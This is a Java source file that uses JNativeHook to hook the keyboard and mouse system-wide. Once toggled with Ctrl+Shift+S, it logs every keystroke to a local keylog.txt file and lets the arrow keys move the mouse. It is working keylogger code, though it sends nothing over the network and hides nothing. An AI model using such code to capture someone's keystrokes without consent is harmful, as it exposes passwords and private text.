import java.awt.Robot;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseInputListener;

public class GlobalKeyListener implements NativeKeyListener, NativeMouseInputListener
{

	static Robot robot;
	private int mousex, mousey = 0;
	private String key;
	private boolean logKeys = false;
	private boolean keyShift = false;
	private boolean keyCtrl = false;
	private boolean keyS = false;
	
	public static void main(String[] args) throws NativeHookException, Exception
	{
		
		robot = new Robot();
		LogManager.getLogManager().reset();
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		
		try 
		{
			GlobalScreen.registerNativeHook();
		}
		catch(NativeHookException e)
		{
			System.err.println("There was a problem registering the native hook.");
			System.err.println(e.getMessage());
			System.exit(1);
		}
		
		GlobalKeyListener fluff = new GlobalKeyListener();
		
		GlobalScreen.addNativeMouseListener(fluff);
		GlobalScreen.addNativeKeyListener(fluff);
		GlobalScreen.addNativeMouseMotionListener(fluff);
		
	}

	public void nativeKeyPressed(NativeKeyEvent e)
	{
		if(logKeys == false)
		{
			if (e.getKeyCode() == NativeKeyEvent.VC_CONTROL) 
				keyCtrl = true;
			else if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) 
		        keyShift = true;
			else if (e.getKeyCode() == NativeKeyEvent.VC_S) 
		        keyS = true;
			
			if(keyCtrl && keyShift && keyS)
				logKeys = true;
		}
		else
		{
			if (e.getKeyCode() == NativeKeyEvent.VC_CONTROL) 
				keyCtrl = true;
			else if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) 
		        keyShift = true;
			else if (e.getKeyCode() == NativeKeyEvent.VC_S)
		        keyS = true;
			
			if(keyCtrl && keyShift && keyS)
				logKeys = false;
			try 
			{			
				if (e.getKeyCode() == NativeKeyEvent.VC_UP)
				{
					robot.mouseMove(mousex, mousey - 10);
					key = "";
				}
				else if(e.getKeyCode() == NativeKeyEvent.VC_DOWN)
				{
					robot.mouseMove(mousex, mousey + 10);
					key = "";
				}
				else if(e.getKeyCode() == NativeKeyEvent.VC_RIGHT)
				{
					robot.mouseMove(mousex + 10, mousey);
					key = "";
				}
				else if(e.getKeyCode() == NativeKeyEvent.VC_LEFT)
				{
					robot.mouseMove(mousex - 10, mousey);
					key = "";
				}
				else if(e.getKeyCode() == NativeKeyEvent.VC_ENTER)
					key = "\n";
				else if(e.getKeyCode() == NativeKeyEvent.VC_BACKSPACE)
					key = "[BckSpc]";
				else if(e.getKeyCode() == NativeKeyEvent.VC_SPACE)
					key = " ";
				else if(e.getKeyCode() == NativeKeyEvent.VC_BACK_SLASH)
					key = "\\";
				else if(e.getKeyCode() == NativeKeyEvent.VC_SLASH)
					key = "/";
				else if(e.getKeyCode() == NativeKeyEvent.VC_COMMA)
					key = ",";
				else if(e.getKeyCode() == NativeKeyEvent.VC_PERIOD)
					key = ".";
				else if(e.getKeyCode() == NativeKeyEvent.VC_QUOTE)
					key = "'";
				else if(e.getKeyCode() == NativeKeyEvent.VC_SEMICOLON)
					key = ";";
				else if(e.getKeyCode() == NativeKeyEvent.VC_CONTROL)
					key = "[CTRL]";
				else if(e.getKeyCode() == NativeKeyEvent.VC_ALT)
					key = "[ALT]";
				else if(e.getKeyCode() == NativeKeyEvent.VC_SHIFT)
					key = "[SHIFT]";
				else if(e.getKeyCode() == NativeKeyEvent.VC_OPEN_BRACKET)
					key = "[";
				else if(e.getKeyCode() == NativeKeyEvent.VC_CLOSE_BRACKET)
					key = "]";
				else if(e.getKeyCode() == NativeKeyEvent.VC_SPACE)
					key = " ";
				else if(e.getKeyCode() == NativeKeyEvent.VC_TAB)
					key = "[TAB]";
				else if(e.getKeyCode() == NativeKeyEvent.VC_CAPS_LOCK)
					key = "[CAPS]";
				else if(e.getKeyCode() == NativeKeyEvent.VC_NUM_LOCK)
					key = "[NUMLCK]";
				else if(e.getKeyCode() == NativeKeyEvent.VC_DELETE)
					key = "[DEL]";
				else
					key = NativeKeyEvent.getKeyText(e.getKeyCode());			
				
				FileWriter wFile = new FileWriter("src//keylog.txt",true);
				wFile.write(key);
				wFile.close();
			}
			catch (IOException e1) 
			{
				System.err.println("IO error:");
				System.err.println(e1.getMessage());
			}
		}
	}

	public void nativeKeyReleased(NativeKeyEvent e) 
	{
		if (e.getKeyCode() == NativeKeyEvent.VC_CONTROL) 
			keyCtrl = false;
		else if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) 
	        keyShift = false;
		else if (e.getKeyCode() == NativeKeyEvent.VC_S) 
	        keyS = false;
	}
	
	public void nativeKeyTyped(NativeKeyEvent e) {}
	
	public void nativeMouseClicked(NativeMouseEvent e) {}
	
	

	public void nativeMousePressed(NativeMouseEvent e) {}

	public void nativeMouseReleased(NativeMouseEvent e) {}

	public void nativeMouseMoved(NativeMouseEvent e) 
	{
		mousex = e.getX();
		mousey = e.getY();
	}

	public void nativeMouseDragged(NativeMouseEvent e) {}

	
}